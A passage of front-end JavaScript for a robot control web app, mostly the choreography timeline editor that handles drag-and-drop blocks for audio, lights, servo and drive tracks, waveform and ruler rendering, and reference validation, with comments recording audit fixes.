    if (document.querySelector('.tab.active')?.dataset.tab !== 'sequences') return;
    if (scriptEngine._dragActive)     return;
    if (scriptEngine._pillDragActive) return;   // EDGE-C2 fix
    if (scriptEngine._renamingName)   return;   // M1 fix: don't blow up inline rename input
    scriptEngine.load();
  }, 15000);

  // Sync ALIVE button state from server
  api('/behavior/status').then(d => {
    if (d && typeof d.alive_enabled === 'boolean' && d.alive_enabled) {
      const btn = el('alive-toggle-btn');
      if (btn) btn.classList.add('alive-btn-on');
    }
  }).catch(() => {});

}

document.addEventListener('DOMContentLoaded', () => {
  // Sync all holo-slider fills on input and on page load
  document.querySelectorAll('.holo-slider').forEach(s => {
    s.addEventListener('input', () => syncHoloSlider(s));
    syncHoloSlider(s);
  });
  _initCamVisibilityHandler();
  _initIconPicker();
  _initThemes();
  init();
});

// ─── REMOVED: LightEditor + SequenceEditor (replaced by Choreo tab) ──────────
// ─── Choreo editor follows ───────────────────────────────────────────────────
// ================================================================

function _chorSelectOptions(names) {
  // Audit finding Frontend M-5 2026-05-15: filename + label + emoji
  // were interpolated into an option HTML string. Filename is regex-
  // validated server-side so today safe, but createElement+textContent
  // is the documented project pattern. Returns innerHTML-compatible
  // for backward compat with the 3 callers, but every dynamic value
  // is now escaped both for the attribute AND the text content.
  return names.map(n => {
    const v   = n.name || n;
    const raw = v.replace(/\.chor$/, '');
    const lbl = (typeof n === 'object' && n.label) ? n.label : raw;
    const emj = (typeof n === 'object' && n.emoji) ? n.emoji + ' ' : '';
    const diff = lbl.toLowerCase().replace(/\s+/g,'_') !== raw.toLowerCase();
    const display = `${emj}${lbl}${diff ? ' (' + raw + ')' : ''}`;
    return `<option value="${escapeHtml(v)}">${escapeHtml(display)}</option>`;
  }).join('');
}

const choreoEditor = (() => {
  // ── State ────────────────────────────────────────────────────────
  let _chor        = null;
  let _pxPerSec    = 30;
  let _zoomFactor  = 1.0;   // 1.0 = fit-to-screen, >1 = zoomed in
  let _snapVal     = 0.1;
  let _selected    = null;
  let _pollTimer   = null;
  let _dirty       = false;
  let _existsOnDisk = false;  // true only after an explicit admin Save or loading an existing file

  // WOW polish E3 2026-05-15: reflect _dirty on the SAVE button so
  // operator can see at a glance there are unsaved changes. Replaces
  // direct _dirty=true/false assignments via a setter wrapper.
  function _setDirty(v) {
    _dirty = !!v;
    const btn = document.querySelector('#tab-choreo button[onclick*="choreoEditor.save"]');
    if (btn) btn.classList.toggle('chor-dirty', _dirty);
    const sel = el('chor-select');
    if (sel) sel.classList.toggle('chor-dirty', _dirty);
  }
  // Inspector audio-duration probe — SINGLE reused Audio instance
  // (B-12 / audit Perf H-2 2026-05-15). _probeToken makes stale
  // loadedmetadata callbacks from a previous probe ignorable.
  let _probeAudio  = null;
  let _probeToken  = 0;
  let _lanesWired   = false;
  let _paletteWired = false;
  // _globalsWired covers page-level listeners that should be installed once
  // for the lifetime of the page, NOT once per Choreo tab switch:
  //   - ResizeObserver on #chor-scroll
  //   - document keydown for Delete/Backspace
  // Before the guard, switching to the Choreo tab 10 times added 10 copies
  // of each, so a single Delete press deleted 10 blocks. The lanes are
  // separately guarded by _lanesWired and the palette by _paletteWired.
  let _globalsWired = false;
  // _busy = an in-flight /choreo/play, /choreo/save or /choreo/stop request.
  // Prevents double-fires from rapid clicks and serializes save↔play so a
  // concurrent save can't race against the server-side play (which reads
  // the .chor file off disk).
  let _busy        = false;
  let _lastTelem   = null;
  let _lastLightsEvT = -1;  // tracks active lights event start time — avoids re-triggering setText every poll
  let _audioOverflowIdxs = new Set();  // indices of audio events that will be dropped
  let _servoIssues  = {};  // { 'dome_servos:0': 'warn'|'error', … }
  let _audioIssues  = {};  // { 'audio:0': 'error'|'warn', … }
  let _vescCfgSnapshot = null;  // { invert_L, invert_R, power_scale } — loaded at init

  // Cached data for inspector dropdowns — loaded once at init
  let _audioIndex    = {};   // { category: [soundName, …] } — from index
  let _audioScanned  = [];   // [soundName, …] — from full disk scan (authoritative)
  let _servoList     = [];   // ['dome_panel_1', …]
  let _servoSettings = {};   // { 'dome_panel_1': {open:110, close:20, speed:10}, … }
  // Light modes: keyed object { 't1': 'Random', 't6': 'Leia Message', …, 'my_seq': 'my_seq' }
  // Populated at init from /teeces/animations (T-codes) + /light/list (.lseq files)
  let _lightModes    = { t1:'Random', t6:'Leia Message', t3:'Alarm', t13:'Disco', t20:'Off' };

  // Inspector banner styles — single source of truth, theme-aware via CSS
  // variables. Previously every banner div hand-coded a hex palette
  // (#3a0010, #ff6688, #ffaa44, #44aaff, #88ddaa…), so the inspector
  // stayed R2-D2 dark-red/amber/blue regardless of the active theme.
  // Border colours use var(--red/amber/blue/green) which all themes
  // override; backgrounds use rgba() of the same hue so they tint
  // correctly with the theme without going opaque.
  const _BNR_BASE = 'padding:6px 8px;margin-bottom:6px;font-size:10px;line-height:1.5;border-radius:3px;border:1px solid';
  const _BNR_ERR  = `${_BNR_BASE} var(--red);background:rgba(255,34,68,.12);color:var(--status-err)`;
  const _BNR_WARN = `${_BNR_BASE} var(--amber);background:rgba(255,179,0,.10);color:var(--status-warn)`;
  const _BNR_INFO = `${_BNR_BASE} rgba(var(--blue-rgb),.55);background:rgba(var(--blue-rgb),.10);color:rgba(var(--blue-rgb),.85)`;
  const _BNR_OK   = `${_BNR_BASE} var(--green);background:rgba(0,204,102,.10);color:var(--status-ok)`;

  // Block palette templates — one entry per draggable chip
  const _PALETTE = [
    { track:'audio', label:'PLAY',  tpl:{ action:'play', file:'', volume:85, duration:5, ch:0 } },
    { track:'audio', label:'PLAY 2',tpl:{ action:'play', file:'', volume:85, duration:5, ch:1 } },
    { track:'audio', label:'STOP',  tpl:{ action:'stop', duration:0.5, ch:0 } },
    { track:'lights',     label:'RANDOM', tpl:{ mode:'random',                                            duration:4   } },
    { track:'lights',     label:'LEIA',   tpl:{ mode:'leia',                                              duration:6   } },
    { track:'lights',     label:'ALARM',  tpl:{ mode:'alarm',                                             duration:3   } },
    { track:'lights',     label:'DISCO',  tpl:{ mode:'disco',                                             duration:5   } },
    { track:'lights',     label:'OFF',    tpl:{ mode:'off',                                               duration:2   } },
    { track:'lights',     label:'TEXT',   tpl:{ mode:'text',  display:'fld_top', text:'HELLO',            duration:3   } },
    { track:'lights',     label:'HOLO',   tpl:{ mode:'holo',  target:'fhp',      effect:'on',             duration:3   } },
    { track:'lights',     label:'PSI',    tpl:{ mode:'psi',   target:'both',     sequence:'normal',        duration:4   } },
    { track:'dome',       label:'DOME',   tpl:{ power:0, duration:500, accel:0.5, easing:'ease-in-out' } },
    { track:'dome_servos', label:'OPEN',   tpl:{ servo:'', action:'open',  group:'dome', duration:1   } },
    { track:'dome_servos', label:'CLOSE',  tpl:{ servo:'', action:'close', group:'dome', duration:1   } },
    { track:'body_servos', label:'OPEN',   tpl:{ servo:'', action:'open',  group:'body', duration:1   } },
    { track:'body_servos', label:'CLOSE',  tpl:{ servo:'', action:'close', group:'body', duration:1   } },
    { track:'arm_servos',  label:'OPEN',   tpl:{ arm:1, action:'open',  group:'arms', panel_duration:1.0, delay:0.5, arm_duration:1.0 } },
    { track:'arm_servos',  label:'CLOSE',  tpl:{ arm:1, action:'close', group:'arms', panel_duration:1.0, delay:0.5, arm_duration:1.0 } },
    { track:'propulsion', label:'DRIVE',  tpl:{ left:0.5, right:0.5,                 duration:3   } },
    { track:'propulsion', label:'STOP',   tpl:{ left:0,   right:0,                   duration:0.5 } },
  ];

  // ── Arm block helpers ──────────────────────────────────────────────
  // Total wall-clock span = panel motion + delay + arm motion.
  // Falls back to the legacy single `duration` field for old .chor files
  // that pre-date the per-segment fields.
  function _armBlockTotalDur(item) {
    const legacy = parseFloat(item.duration);
    const panel  = parseFloat(item.panel_duration);
    const delay  = parseFloat(item.delay);
    const arm    = parseFloat(item.arm_duration);
    if (!isNaN(panel) || !isNaN(delay) || !isNaN(arm)) {
      const p = isNaN(panel) ? (isNaN(legacy) ? 1.0 : legacy) : panel;
      const d = isNaN(delay) ? 0.5 : delay;
      const a = isNaN(arm)   ? (isNaN(legacy) ? 1.0 : legacy) : arm;
      return Math.max(0.1, p + d + a);
    }
    return isNaN(legacy) ? 2.5 : Math.max(0.1, legacy);
  }

  // ── Snap helper ──────────────────────────────────────────────────
  function _snap(t) {
    if (!_snapVal) return Math.round(t * 100) / 100;
    return Math.round(t / _snapVal) * _snapVal;
  }

  // ── Helpers ──────────────────────────────────────────────────────
  function _px(sec)  { return sec * _pxPerSec; }
  function _sec(px)  { return px  / _pxPerSec; }
  function _fmtTime(s) {
    const m   = Math.floor(s / 60);
    const sec = (s % 60).toFixed(3).padStart(6, '0');
    return `${String(m).padStart(2, '0')}:${sec}`;
  }

  // Build reverse map: normalised_label → servo_id from _servoSettings
  // e.g. { 'dome_panel_1': 'Servo_M0', 'front_arm': 'Servo_S3' }
  function _buildLabelToId() {
    const map = {};
    for (const [id, cfg] of Object.entries(_servoSettings)) {
      if (cfg.label) {
        const norm = cfg.label.toLowerCase().replace(/[\s\-\.\(\)]+/g, '_').replace(/_+/g, '_').replace(/^_|_$/g, '');
        map[norm] = id;
      }
      map[id.toLowerCase()] = id;  // also accept 'servo_m0' → 'Servo_M0'
    }
    return map;
  }

  const _SERVO_SPECIAL = new Set(['all', 'all_dome', 'all_body']);
  const _SERVO_ID_RE   = /^Servo_[MS]\d+$/;

  // Upgrade label-based servo refs to hardware IDs in-place.
  // Returns 'migrated' if all found refs were resolved,
  //         'partial'  if some refs could not be resolved (label unknown),
  //         false      if no legacy refs were found.
  function _migrateLegacyServoRefs() {
    const labelToId = _buildLabelToId();
    let migrated   = false;
    let unresolved = false;
    for (const track of ['dome_servos', 'body_servos', 'arm_servos']) {
      for (const ev of (_chor.tracks[track] || [])) {
        if (!ev.servo || _SERVO_SPECIAL.has(ev.servo) || _SERVO_ID_RE.test(ev.servo)) continue;
        const norm  = ev.servo.toLowerCase().replace(/[\s\-\.\(\)]+/g, '_').replace(/_+/g, '_').replace(/^_|_$/g, '');
        const found = labelToId[norm];
        if (found) {
          ev.servo_label = _servoSettings[found]?.label || ev.servo;
          ev.servo       = found;
          migrated       = true;
        } else {
          unresolved = true;
        }
      }
    }
    if (unresolved) return 'partial';
    if (migrated)   return 'migrated';
    return false;
  }

  // Build _servoIssues map after migration.
  // 'warn'  = servo ID valid, but servo_label doesn't match current label (renamed)
  // 'error' = servo ID not in _servoSettings at all
  function _validateServoRefs() {
    _servoIssues = {};
    if (!_chor) return;
    for (const track of ['dome_servos', 'body_servos', 'arm_servos']) {
      (_chor.tracks[track] || []).forEach((ev, idx) => {
        if (!ev.servo || _SERVO_SPECIAL.has(ev.servo)) return;
        const key     = `${track}:${idx}`;
        const current = _servoSettings[ev.servo];
        if (!current) {
          _servoIssues[key] = 'error';
        } else if (ev.servo_label && ev.servo_label !== current.label) {
          _servoIssues[key] = 'warn';
        }
      });
    }
  }

  // Build _audioIssues — error if file not on slave, warn if RANDOM category unknown.
  function _validateAudioRefs() {
    _audioIssues = {};
    if (!_chor) return;
    const scannedSet = new Set(_audioScanned.map(s => s.toUpperCase()));
    const knownCats  = new Set(Object.keys(_audioIndex).map(c => c.toLowerCase()));
    (_chor.tracks.audio || []).forEach((ev, idx) => {
      if (ev.action !== 'play' || !ev.file) return;
      const file = ev.file;
      if (file.toUpperCase().startsWith('RANDOM:')) {
        const cat = file.slice(7).split(':')[0].toLowerCase();
        if (knownCats.size > 0 && !knownCats.has(cat))
          _audioIssues[`audio:${idx}`] = 'warn';  // category unknown
      } else {
        // Authoritative check: scanned list from slave disk
        if (scannedSet.size > 0 && !scannedSet.has(file.toUpperCase()))
          _audioIssues[`audio:${idx}`] = 'error';  // file not found on slave
      }
    });
  }

  // Before saving: refresh servo_label for every servo event from current config.
  // Keeps the label field as self-documenting metadata, always matching last-known name.
  function _refreshServoLabels() {
    if (!_chor) return;
    for (const track of ['dome_servos', 'body_servos', 'arm_servos']) {
      (_chor.tracks[track] || []).forEach((ev, idx) => {
        if (!ev.servo || _SERVO_SPECIAL.has(ev.servo)) return;
        // Only refresh label for servos with no issue — servos still flagged ⚠️/❌
        // keep their stored label so the user knows which ones still need fixing.
        const issueKey = `${track}:${idx}`;
        if (_servoIssues[issueKey]) return;
        const current = _servoSettings[ev.servo];
        if (current?.label) ev.servo_label = current.label;
      });
    }
  }

  // Show a dismissible banner above the timeline if the Choreo's VESC config
  // snapshot differs from the current machine config (invert_L/R or power_scale).
  function _showVescMismatchBanner(snapshot) {
    const existing = document.getElementById('chor-vesc-banner');
    if (existing) existing.remove();
    if (!_vescCfgSnapshot || !snapshot) return;

    // Support both prefixed (vesc_invert_L) and unprefixed (invert_L) key formats
    const snapInvL  = snapshot.vesc_invert_L  ?? snapshot.invert_L  ?? false;
    const snapInvR  = snapshot.vesc_invert_R  ?? snapshot.invert_R  ?? false;
    const snapScale = snapshot.vesc_power_scale ?? snapshot.power_scale ?? 1;
    const invertMismatch = snapInvL !== _vescCfgSnapshot.invert_L
                        || snapInvR !== _vescCfgSnapshot.invert_R;
    const scaleMismatch  = Math.abs(snapScale - (_vescCfgSnapshot.power_scale ?? 1)) > 0.05;

    if (!invertMismatch && !scaleMismatch) return;

    const lines = [];
    if (invertMismatch) {
      lines.push(
        `\u26a0\ufe0f Motor direction mismatch \u2014 ` +
        `Choreo: L=${snapInvL ? 'INV' : 'FWD'} R=${snapInvR ? 'INV' : 'FWD'} | ` +
        `Current: L=${_vescCfgSnapshot.invert_L ? 'INV' : 'FWD'} R=${_vescCfgSnapshot.invert_R ? 'INV' : 'FWD'}`
      );
    }
    if (scaleMismatch) {
      lines.push(
        `\u2139\ufe0f Power scale: was ${(snapScale * 100).toFixed(0)}%,` +
        ` now ${((_vescCfgSnapshot.power_scale ?? 1) * 100).toFixed(0)}%`
      );
    }

    const banner = document.createElement('div');
    banner.id = 'chor-vesc-banner';
    // Theme-aware now \u2014 was hard-coded #3a0010 / #2a1a00 dark-red/amber
    // palettes regardless of active theme. Same pattern as _BNR_ERR/WARN
    // but with the wider banner layout (justify-content:space-between).
    const _common = 'padding:6px 10px;margin:4px 0;font-size:11px;border-radius:3px;display:flex;justify-content:space-between;align-items:center;border:1px solid';
    banner.style.cssText = invertMismatch
      ? `${_common} var(--red);background:rgba(255,34,68,.12);color:var(--status-err)`
      : `${_common} var(--amber);background:rgba(255,179,0,.10);color:var(--status-warn)`;
    banner.innerHTML =
      `<span>${lines.join(' &nbsp;|&nbsp; ')}</span>` +
      `<button type="button" class="chor-banner-close" style="background:none;border:none;color:inherit;cursor:pointer;font-size:13px;padding:0 4px">\u2715</button>`;
    // addEventListener instead of inline onclick=... \u2014 CSP-compatible and
    // consistent with the rest of the modern app (toast/cockpit/etc.).
    banner.querySelector('.chor-banner-close')
      .addEventListener('click', () => banner.remove());

    const slot = document.getElementById('chor-banner-slot');
    if (slot) { slot.innerHTML = ''; slot.appendChild(banner); }
  }

  // Effective wall-clock duration of an event, normalised to seconds.
  // Used by total-duration math, layer cascade, and block visual width so
  // every track speaks the same units regardless of how its duration is
  // stored (dome → ms, arm_servos → 3 component fields, others → seconds).
  function _eventEffectiveDuration(track, ev) {
    if (!ev) return 0;
    if (track === 'dome')        return (ev.duration || 0) / 1000;
    if (track === 'arm_servos')  return _armBlockTotalDur(ev);
    return ev.duration || 0;
  }

  // Dynamic timeline: latest event end + 2s buffer
  function _calcTotalDuration() {
    // Visual duration — canvas + ruler sizing (2s padding for editing comfort)
    if (!_chor) return 10.0;
    let max = 0;
    for (const [track, events] of Object.entries(_chor.tracks || {})) {
      for (const ev of (events || [])) {
        const end = (ev.t || 0) + _eventEffectiveDuration(track, ev);
        if (end > max) max = end;
      }
    }
    return Math.max(max + 2.0, 5.0);
  }

  function _calcPlaybackDuration() {
    // Playback duration sent to Pi — 100ms buffer after last event, then stop
    if (!_chor) return 5.0;
    let max = 0;
    for (const [track, events] of Object.entries(_chor.tracks || {})) {
      for (const ev of (events || [])) {
        const end = (ev.t || 0) + _eventEffectiveDuration(track, ev);
        if (end > max) max = end;
      }
    }
    return Math.max(max + 0.1, 1.0);
  }

  // Update ruler + canvas width + duration display.
  // If _pxPerSec changes (timeline auto-extended/shrunk via fit-to-screen
  // because an event was added, moved, resized or deleted), every existing
  // block on every track is now positioned at the wrong x. We re-render
  // all tracks in that case so they stay aligned with the ruler.
  function _refreshLayout() {
    if (!_chor) return;
    const oldPps = _pxPerSec;
    _fitToScreen();
    const durVisual   = _calcTotalDuration();
    const durPlayback = _calcPlaybackDuration();
    _chor.meta.duration = durPlayback;   // Pi stops 100ms after last event
    _renderRuler(durVisual);
    _syncLaneWidths(durVisual);
    _drawWaveform();
    const durEl = document.getElementById('chor-duration');
    if (durEl) durEl.textContent = _fmtTime(durPlayback);
    if (Math.abs(_pxPerSec - oldPps) > 0.01) {
      ['audio', 'lights', 'dome', 'dome_servos', 'body_servos', 'arm_servos', 'propulsion'].forEach(t => _renderTrack(t));
      _renderMarkers();
    }
  }

  // Fit pxPerSec so that total duration exactly fills the scroll-wrap width.
  // _zoomFactor > 1 zooms in (content wider than container — clips without scroll).
  function _fitToScreen() {
    const wrap = document.getElementById('chor-scroll');
    if (!wrap) return;
    const containerW = wrap.clientWidth;
    if (containerW <= 0) return;
    const dur = _calcTotalDuration();
    if (dur <= 0) return;
    // Floor at 0.5 px/s — was 5 px/s, which broke fit-to-screen for any
    // sequence longer than ~140s on a typical 700px container:
    //   max(5, 700/152) = max(5, 4.6) = 5 forced → canvas wants 152*5 =
    //   760px > container 700px → last ~12s (60px) clipped by
    //   overflow-x:clip on .chor-scroll-wrap. The OFF lights block on
    //   disco.chor (t=150..152s) and similar end-of-sequence events fell
    //   entirely past the visible edge.
    //
    // 0.5 px/s allows fit for sequences up to ~1400s in a 700px container.
    // Below that floor the canvas would have zero usable resolution; users
    // who genuinely need longer sequences can ZOOM IN (_zoomFactor > 1)
    // to inspect specific regions.
    _pxPerSec = Math.max(0.5, (containerW / dur) * _zoomFactor);
  }

  // Always returns the scroll-wrap client width — content is always fit-to-screen.
  function _liquidWidth(duration) {
    const wrap = document.getElementById('chor-scroll');
    return wrap ? Math.max(wrap.clientWidth, 100) : Math.max(_px(duration) + 40, 100);
  }

  function _syncLaneWidths(duration) {
    const w = _liquidWidth(duration) + 'px';
    document.querySelectorAll('.chor-lane').forEach(l => l.style.width = w);
  }

  function _lane(track) { return document.getElementById(`chor-lane-${track}`); }

  // ── Monitor — delegates to _chorMon photorealistic engine ────────
  function _startMonitor() { _chorMon.init(); }
  function _stopMonitor()  { /* _chorMon rAF loop continues — driven by timeline */ }

  // Populate the block palette and attach dragstart handlers
  // Wire the Ultratime source buttons (one per track, already in HTML).
  // Idempotent: callable on every Choreo tab switch but only attaches the
  // dragstart/dragend listeners on the FIRST call. Before the _paletteWired
  // guard, N tab switches stacked N copies of the dragstart handler on each
  // .chor-src-btn — so a single drag created N ghost elements and N
  // dataTransfer.setData calls (last one wins, but cost was real).
  function _initPalette() {
    if (_paletteWired) return;
    _paletteWired = true;
    document.querySelectorAll('.chor-src-btn').forEach(btn => {
      // Build a colour-matched drag ghost image
      btn.addEventListener('dragstart', e => {
        let tpl;
        try { tpl = JSON.parse(btn.dataset.tpl); } catch { return; }
        const track = btn.dataset.track;
        e.dataTransfer.effectAllowed = 'copy';
        e.dataTransfer.setData('application/json', JSON.stringify({ track, tpl }));

        // Ghost: a mini coloured badge that follows the cursor
        const ghost = document.createElement('div');
        ghost.textContent = btn.textContent;
        ghost.style.cssText = `
          position:fixed; top:-200px; left:-200px;
          font:bold 9px/22px 'Courier New',monospace;
          padding:0 10px; border-radius:3px;
          border:1px solid currentColor; background:rgba(0,0,0,.8);
          letter-spacing:1.4px; white-space:nowrap;
          color:${getComputedStyle(btn).color};
          border-color:${getComputedStyle(btn).borderTopColor};
          box-shadow:0 0 10px ${getComputedStyle(btn).color};
        `;
        document.body.appendChild(ghost);
        e.dataTransfer.setDragImage(ghost, ghost.offsetWidth / 2, 11);
        setTimeout(() => ghost.remove(), 0);
      });

      btn.addEventListener('dragend', () => {
        document.querySelectorAll('.chor-lane.drag-over').forEach(l => l.classList.remove('drag-over'));
      });
    });
  }

  // Wire HTML5 drop targets on all timeline lanes
  function _addDropToLanes() {
    if (_lanesWired) return;
    _lanesWired = true;
    // Audit finding Perf M-1 2026-05-15: clicking the empty timeline
    // background (canvas wrap, not on a block / handle / ruler)
    // deselects so the inspector clears.
    const canvasWrap = document.getElementById('chor-canvas');
    if (canvasWrap) {
      canvasWrap.addEventListener('click', (e) => {
        if (e.target.closest('.chor-block')) return;
        if (e.target.closest('.chor-ruler-tick')) return;
        _deselectAll();
      });
    }
    document.querySelectorAll('.chor-lane').forEach(lane => {
      lane.addEventListener('dragover', e => {
        e.preventDefault();
        e.dataTransfer.dropEffect = 'copy';
        lane.classList.add('drag-over');
      });
      lane.addEventListener('dragleave', e => {
        if (!lane.contains(e.relatedTarget)) lane.classList.remove('drag-over');
      });
      lane.addEventListener('drop', e => {
        e.preventDefault();
        lane.classList.remove('drag-over');
        if (!_chor) { toast('Load a choreography first', 'error'); return; }
        let data;
        try { data = JSON.parse(e.dataTransfer.getData('application/json')); } catch { return; }
        const { track, tpl } = data;
        const laneTrack = lane.dataset.track;
        if (laneTrack !== track) { toast(`Drop a ${track} block on the ${track} lane`, 'error'); return; }
        const scroll = document.getElementById('chor-scroll');
        const scrollLeft = scroll ? scroll.scrollLeft : 0;
        const rect = lane.getBoundingClientRect();
        const rawT = _sec(Math.max(0, e.clientX - rect.left + scrollLeft));
        // Clamp t to a sane upper bound — without this, a drag that overshoots
        // past the canvas (browser auto-scroll, oversensitive trackpad) can
        // land at t=300s on a 10s timeline; _fitToScreen() then shrinks the
        // px/sec to fit, leaving every existing block as a sliver. Use the
        // current playback duration plus 10s grace, with a 20s floor for new
        // sequences. The inspector still lets the user enter any t manually.
        const maxT = Math.max(20, _calcPlaybackDuration() + 10);
        let t = _snap(Math.min(rawT, maxT));
        if (rawT > maxT) {
          toast(`Drop clamped to ${maxT.toFixed(1)}s — edit START in inspector for later events`, 'warn');
        }
        const newItem = { ...tpl, t };
        if (!_chor.tracks[track]) _chor.tracks[track] = [];
        _chor.tracks[track].push(newItem);
        _chor.tracks[track].sort((a, b) => a.t - b.t);
        _setDirty(true);
        _renderTrack(track);
        _refreshLayout();
        if (track === 'audio') _validateAudioOverflow();
        const idx = _chor.tracks[track].indexOf(newItem);
        if (track !== 'dome') _selectBlock(track, idx);
        toast(`${track} block → ${t.toFixed(2)}s`, 'ok');
      });
    });
  }

  // ── Audio waveform ────────────────────────────────────────────────
  function _drawWaveform() {
    const canvas = document.getElementById('chor-waveform-canvas');
    const lane   = _lane('audio');
    if (!canvas || !lane || !_chor) return;
    const W = _liquidWidth(_chor.meta.duration);
    const H = lane.clientHeight || 44;
    canvas.width = W; canvas.height = H;
    canvas.style.width = W + 'px'; canvas.style.height = H + 'px';
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, W, H);
    const barW = 2, barGap = 1;
    // Draw a per-block waveform — color by channel (ch=0 cyan, ch=1 orange)
    for (const ev of (_chor.tracks.audio || [])) {
      if (ev.action !== 'play' || !ev.file) continue;
      const x0   = _px(ev.t || 0);
      const x1   = _px((ev.t || 0) + (ev.duration || 5));
      const ch   = ev.ch || 0;
      const grad = ctx.createLinearGradient(0, 0, 0, H);
      if (ch === 1) {
        grad.addColorStop(0, 'rgba(255,153,0,0.80)');
        grad.addColorStop(1, 'rgba(180,80,0,0.12)');
      } else {
        grad.addColorStop(0, 'rgba(0,200,255,0.80)');
        grad.addColorStop(1, 'rgba(0,100,180,0.12)');
      }
      ctx.fillStyle = grad;
      let hash = 0;
      for (let i = 0; i < ev.file.length; i++) hash = ((hash << 5) - hash + ev.file.charCodeAt(i)) | 0;
      const nBars = Math.floor((x1 - x0) / (barW + barGap));
      for (let i = 0; i < nBars; i++) {
        hash = ((hash * 1664525) + 1013904223) | 0;
        const bh = (0.15 + Math.abs((hash & 0x7fffffff) / 0x7fffffff) * 0.85) * H;
        ctx.fillRect(x0 + i * (barW + barGap), (H - bh) / 2, barW, bh);
      }
    }
  }


  // ── Ruler ─────────────────────────────────────────────────────────
  // Audit finding Perf L-G/L-10 2026-05-15: skip rebuild if the
  // ruler fingerprint (px-per-second + total seconds) didn't change.
  // Rebuilding ~1400 tick divs for a 1400s sequence on every
  // _refreshLayout (called per drag / drop / prop edit) was waste —
  // the ruler only needs updating when the zoom or duration changes.
  let _rulerFp = null;
  function _renderRuler(duration) {
    const ruler = document.getElementById('chor-ruler');
    if (!ruler) return;
    const fullW = _liquidWidth(duration);
    const total = Math.ceil(_sec(fullW));
    const fp = `${_pxPerSec}|${total}`;
    if (fp === _rulerFp && ruler.children.length === total + 1) {
      const canvas = document.getElementById('chor-canvas');
      if (canvas) canvas.style.width = fullW + 'px';
      return;
    }
    _rulerFp = fp;
    ruler.replaceChildren();
    for (let s = 0; s <= total; s++) {
      const major = s % 5 === 0;
      const tick  = document.createElement('div');
      tick.className = 'chor-tick' + (major ? ' major' : '');
      tick.style.left = _px(s) + 'px';
      if (major) tick.textContent = s + 's';
      ruler.appendChild(tick);
    }
    const canvas = document.getElementById('chor-canvas');
    if (canvas) canvas.style.width = fullW + 'px';
  }

  // ── Track rendering ───────────────────────────────────────────────
  function _renderAllTracks() {
    if (!_chor) return;
    _fitToScreen();
    ['audio', 'lights', 'dome', 'dome_servos', 'body_servos', 'arm_servos', 'propulsion'].forEach(t => _renderTrack(t));
    _renderMarkers();
    const durVisual   = _calcTotalDuration();
    const durPlayback = _calcPlaybackDuration();
    _chor.meta.duration = durPlayback;
    _renderRuler(durVisual);
    _syncLaneWidths(durVisual);
    _drawWaveform();
    const durEl = document.getElementById('chor-duration');
    if (durEl) durEl.textContent = _fmtTime(durPlayback);
  }

  // Block cascade constants — shingled layout
  const _BLOCK_H    = 32;   // px — block height (32px tall)
  const _SHINGLE    = 20;   // px — vertical offset per layer (overlap = BLOCK_H - SHINGLE = 12px)
  const _LANE_PAD   = 5;    // px — top padding inside lane
  const _LANE_MIN_H = 44;   // px — minimum lane height (single layer)

  function _computeLayers(items, track) {
    const layerEnds = [];   // layerEnds[i] = end time of last block in layer i
    return items.map(item => {
      const t   = item.t || 0;
      const dur = _eventEffectiveDuration(track, item) || 2.0;
      const end = t + dur;
      let layer = layerEnds.findIndex(e => e <= t);
      if (layer === -1) layer = layerEnds.length;
      layerEnds[layer] = end;
      return layer;
    });
  }

  function _syncTrackRow(track, heightPx) {
    const row = document.querySelector(`.chor-track-row[data-track="${track}"]`);
    if (row) row.style.height = heightPx + 'px';
  }

  function _renderTrack(track) {
    const lane = _lane(track);
    if (!lane) return;
    lane.querySelectorAll('.chor-block').forEach(b => b.remove());
    const items = _chor.tracks[track] || [];
    if (track === 'dome') { _renderDomeLane(items); return; }

    const layers   = _computeLayers(items, track);
    const maxLayer = layers.length > 0 ? Math.max(...layers) : 0;
    // BaseHeight (44) + each extra layer adds one SHINGLE step
    const laneH    = Math.max(_LANE_MIN_H, _LANE_PAD + _BLOCK_H + maxLayer * _SHINGLE + _LANE_PAD);
    lane.style.height = laneH + 'px';
    _syncTrackRow(track, laneH);

    items.forEach((item, idx) => lane.appendChild(_makeBlock(track, item, idx, layers[idx])));
  }

  function _makeBlock(track, item, idx, layer = 0) {
    const block = document.createElement('div');
    block.className = 'chor-block';
    block.dataset.track = track;
    block.dataset.idx   = idx;
    if (item.mode) block.dataset.mode = item.mode;
    const t   = item.t        || 0;
    const isAudioTrack = track === 'audio';
    // Visual block width = effective wall-clock duration in seconds.
    // _eventEffectiveDuration handles dome (ms) + arm_servos (3 fields) +
    // legacy fallback in one place. Audio gets a 5s default for empty blocks
    // so the user can drop on an empty waveform; everything else gets 2s.
    let dur = _eventEffectiveDuration(track, item);
    if (!dur) dur = isAudioTrack ? 5.0 : 2.0;
    const isAudioLocked = isAudioTrack && item.duration > 0;
    block.style.left    = _px(t)   + 'px';
    block.style.width   = _px(dur) + 'px';
    block.style.top     = (_LANE_PAD + layer * _SHINGLE) + 'px';
    block.style.height  = _BLOCK_H + 'px';
    block.style.bottom  = 'auto';
    block.style.zIndex  = 2 + layer;   // higher layers sit on top; lower layers clickable via exposed strip
    const isServoTrack = (track === 'dome_servos' || track === 'body_servos' || track === 'arm_servos');
    const issueKey   = `${track}:${idx}`;
    const issueLevel = isServoTrack ? _servoIssues[issueKey]
                     : track === 'audio' ? _audioIssues[issueKey]
                     : undefined;
    const issueBadge = issueLevel === 'error'
      ? `<span class="chor-issue-badge error" title="${track === 'audio' ? 'Sound file not found on slave' : 'Servo ID not found in config — click to reassign'}">❌</span>`
      : issueLevel === 'warn'
      ? `<span class="chor-issue-badge warn" title="${track === 'audio' ? 'Unknown RANDOM category' : 'Servo label changed since creation — verify intent'}">⚠️</span>`
      : '';
    block.innerHTML = `<span style="pointer-events:none;overflow:hidden;text-overflow:ellipsis;flex:1">${escapeHtml(_blockLabel(track, item))}</span>
                       ${issueBadge}
                       ${isAudioLocked ? '' : '<div class="chor-block-resize" data-resize="true"></div>'}`;
    _attachBlockEvents(block, track, idx);
    if (track === 'audio' && _audioOverflowIdxs.has(idx)) {
      block.style.outline = '1px solid #ff4444';
      block.title = 'May be dropped — all audio slots full at this timestamp';
    }
    block.addEventListener('mouseenter', e => _showTooltip(e, track, item));
    block.addEventListener('mousemove',  e => _positionTooltip(e));
    block.addEventListener('mouseleave', ()  => _hideTooltip());
    return block;
  }

  function _blockLabel(track, item) {
    if (track === 'audio') {
      const f = item.file || '?';
      if (f.toUpperCase().startsWith('RANDOM:')) return `🎲 ${f.slice(7).toUpperCase()}`;
      return f;
    }
    if (track === 'lights') {
